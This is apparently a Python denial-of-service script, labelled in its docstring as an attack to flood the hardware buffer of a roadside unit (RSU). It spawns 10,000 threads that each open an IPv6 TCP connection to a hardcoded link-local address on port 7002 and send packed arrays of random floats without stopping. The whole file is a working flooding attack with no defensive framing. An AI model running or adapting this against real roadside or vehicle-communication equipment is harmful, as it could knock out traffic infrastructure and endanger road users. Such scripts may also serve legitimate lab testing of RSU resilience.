#! /usr/bin/env python3
'''
To DoS Atack: flood h/w bufer for RSU form RSPC

Prakhar Gupta
'''

import socket
import time
import threading
import random
import struct

TARGET_IP = 'fe80::6e5:48ff:fe30:0820'  # RSU IP address (modify as necessary)
TARGET_PORT = 7002           # Replace with the target port

# TARGET_IP = 'localhost'
# TARGET_PORT = 7005


NUM_CONNECTIONS = 10000      # Total concurrent connections
PAYLOAD_SIZE = 8192        # Payload size to simulate overflow
DELAY_BETWEEN_SENDS = 0.01 # Seconds (10ms) between sends
INTERFACE_SCOPE_ID = 2 # 5
VEH_ARRAY_SIZE =  68

def attack():
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(5)

        # Use correct 4-tuple format for IPv6
        s.connect((TARGET_IP, TARGET_PORT, 0, INTERFACE_SCOPE_ID))  # <- fix here

        print(f"[+] Connected to RSU at [{TARGET_IP}]:{TARGET_PORT}")

        while True:
            float_values = [random.uniform(0.0, 100.0) for _ in range(VEH_ARRAY_SIZE)]
            float_values[0] = -1.0
            packed_data = struct.pack(f'{VEH_ARRAY_SIZE}f', *float_values)
            try:
                s.sendall(packed_data)
                time.sleep(DELAY_BETWEEN_SENDS)
            except Exception as send_err:
                print(f"[!] Send error: {send_err}")
                break

        s.close()
    except Exception as e:
        print(f"[!] Connection failed: {e}")


def main():
    print(f"[i] Launching DoS attack with {NUM_CONNECTIONS} threads...")
    threads = []

    for _ in range(NUM_CONNECTIONS):
        t = threading.Thread(target=attack)
        t.daemon = True  # Dies with the main process
        threads.append(t)
        t.start()
        time.sleep(0.01)  # Slight stagger

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[i] Attack stopped by user.")

if __name__ == "__main__":
    main()
